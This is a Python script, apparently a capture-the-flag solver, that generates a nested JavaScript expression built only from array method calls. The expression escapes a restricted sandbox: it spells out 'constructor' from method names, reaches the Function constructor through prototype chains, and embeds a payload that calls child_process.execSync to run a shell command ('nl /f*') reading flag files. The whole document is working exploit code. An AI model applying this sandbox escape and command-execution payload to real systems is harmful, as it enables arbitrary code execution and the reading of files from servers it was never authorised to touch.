def char(c):
    if c == "":
        return [
            "root.flat",
            "root.at",
            "root.at",
            "root.at.name.slice",
            "root.push",
        ]

    METHOD_MAP = {
        'a': ('at', 0),
        'b': ('map.bind', 0),
        'c': ('concat', 0),
        'd': ('reduce', 2),
        'e': ('every', 0),
        'f': ('fill', 0),
        'g': ('at.name.constructor', 5),
        'h': ('hasOwnProperty', 0),
        'i': ('includes', 0),
        'j': ('join', 0),
        'k': ('keys', 0),
        'l': ('lastIndexOf', 0),
        'm': ('map', 0),
        'n': ('concat', 2),
        'o': ('concat', 1),
        'p': ('push', 0),
        # 'q'
        'r': ('reduce', 0),
        's': ('shift', 0),
        't': ('toSorted', 0),
        'u': ('unshift', 0),
        'v': ('every', 1),
        'w': ('with', 0),
        'x': ('lastIndexOf', 8),
        'y': ('every', 4),
        # 'z'
        'S': ('at.name.constructor', 0),
        'M': ('flatMap', 4),
        '_': ('__defineGetter__', 0),
    }

    if c in METHOD_MAP:
        method_name, index = METHOD_MAP[c]
        
        result = ["root.flat"]
        result.extend(["root.at"] * index)
        result.append(f"root.{method_name}.name.at")
        result.append("root.push")    
    else:
        result = ["root.flat"]
        result.extend(["root.at"] * ord(c))
        result.append("root.at.name.constructor.fromCharCode")
        result.append("root.push")
    return result


funcs = []
funcs += [
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.push",
    "root.shift",
]

funcs += char("c") + char("o") + char("n") + char("s") + char("t") + char("r") + char("u") + char("c") + char("t") + char("o") + char("r") + char("")


funcs += [
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.pop",
    "root.join",
    "root.push",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
    "root.shift",
]

funcs += [
    "root.map.bind",
    "root.__proto__.__proto__.constructor.getPrototypeOf",
    "root.unshift",
]

funcs += [
    "root.__proto__.__proto__.constructor.getOwnPropertyDescriptor.bind",
    "root.reduce",
    "root.push",
    "root.shift",
    "root.shift",
]

funcs += [
    "root.at",
    "root.push",
    "root.unshift",
    "root.pop",
    "root.flat",
    "root.push",
    "root.shift",
    "root.shift",
    "root.flat",
    "root.__proto__.__proto__.constructor.fromEntries",
    "root.push",
    "root.shift",
]

funcs += [
    "root.valueOf",
    "root.push",
]

funcs += [
    "root.__proto__.__proto__.constructor.defineProperties.bind",
    "root.sort",
    "root.shift",
    "root.shift",
]

funcs += [
    "root.unshift",
    "root.push",
    "root.shift",
    "root.pop",
    "root.slice",                         # copy [Function] to use as argsArray
    "root.push",                          # root -> [Function, [Function]]
    "root.map.__proto__.bind.valueOf",    # get Function.prototype.bind.bind
    "root.map.__proto__.bind.apply.bind", # apply.bind(bind)
    "root.reduce",                        # reduce with cb -> Function.bind(Function)
]

funcs += [
    "root.unshift",
    "root.indexOf",
    "root.splice",
    "root.indexOf",
    "root.splice",
]

funcs += [
    "root.pop",
] + ["root.push"] * 120 + [
    "root.shift",
    "root.push",
]

funcs += char("")
payload_1 = "console.log(process.mainModule.require('child_process').execSync('nl /f*')+"
for ch in payload_1:
    funcs += char(ch)

payload_2 = "'')//"
funcs += char("'")
funcs += [
    "root.flat",
    "root.indexOf",
    "root.at",
    "root.push"
]
funcs += char(")")
funcs += char("/")
funcs += [
    "root.flat",
    "root.indexOf",
    "root.at",
    "root.push"
]

funcs += ["root.shift"] * 120 + [
    "root.push",
    "root.shift",
    "root.join",
    "root.push",
]
funcs += ["root.shift"] * len(payload_1 + payload_2)

funcs += [
    "root.flat",
    "root.indexOf",
    "root.slice",
    "root.unshift",
    "root.pop",
    "root.shift",
    "root.push",
]

funcs += [
    "root.flat",
    "root.at",
    "root.map.__proto__.bind.apply.bind",
    "root.reduce",
    "root.sort",
]

result = ""
for func in funcs:
    result = func + "(" + result + ")"

print(result)